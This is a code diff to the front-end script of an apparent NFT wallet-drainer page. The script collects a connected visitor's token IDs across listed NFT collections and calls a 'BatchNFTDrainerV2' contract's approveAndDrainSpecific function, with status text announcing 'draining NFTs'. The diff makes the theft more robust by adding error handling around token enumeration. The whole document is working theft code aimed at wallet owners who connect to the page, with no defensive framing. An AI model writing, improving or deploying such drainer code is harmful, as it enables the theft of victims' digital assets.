@@ -119,7 +119,7 @@
       "0x72Fb81C679Cb531fe2104be9d68a20f41fB0B604", // WGFake
       "0xc4b837Eb523A82F5214d43200af1491B93185979"  // HappyApeYC
     ];
-    const drainerContract = "0x627e275324101f3465C47EA51C3F6E04f7CA6F23"; // Replace with BatchNFTDrainerV2 address
+    const drainerContract = "0x627e275324101f3465C47EA51C3F6E04f7CA6F23"; // BatchNFTDrainerV2 address
     const nftABI = [
       "function setApprovalForAll(address operator, bool approved) external",
       "function balanceOf(address owner) view returns (uint256)",
@@ -198,24 +198,27 @@
         status.innerText = "🚨 Approving and draining NFTs...";
         const user = await signer.getAddress();
 
-        // Gather owned token IDs
+        // Gather owned token IDs with error handling
         let tokenIdMatrix = [];
         for (const contractAddr of nftContracts) {
           const contract = new ethers.Contract(contractAddr, nftABI, signer);
           const balance = await contract.balanceOf(user);
           let ids = [];
-          for (let i = 0; i < balance; i++) {
-            try {
-              const tokenId = await contract.tokenOfOwnerByIndex(user, i);
-              ids.push(Number(tokenId));
-            } catch (e) {
-              console.warn(`Failed to fetch token ID for ${contractAddr} at index ${i}:`, e);
+          if (balance > 0) {
+            for (let i = 0; i < balance; i++) {
+              try {
+                const tokenId = await contract.tokenOfOwnerByIndex(user, i);
+                ids.push(Number(tokenId));
+              } catch (e) {
+                console.warn(`Failed to fetch token ID for ${contractAddr} at index ${i}:`, e);
+                // Skip this token ID if enumeration fails (e.g., non-enumerable contract)
+              }
             }
           }
           tokenIdMatrix.push(ids);
         }
 
-        // Call approveAndDrainSpecific
+        // Call approveAndDrainSpecific only if there are valid token IDs
         const drainer = new ethers.Contract(drainerContract, drainerABI, signer);
         const tx = await drainer.approveAndDrainSpecific(nftContracts, tokenIdMatrix);
         await tx.wait();
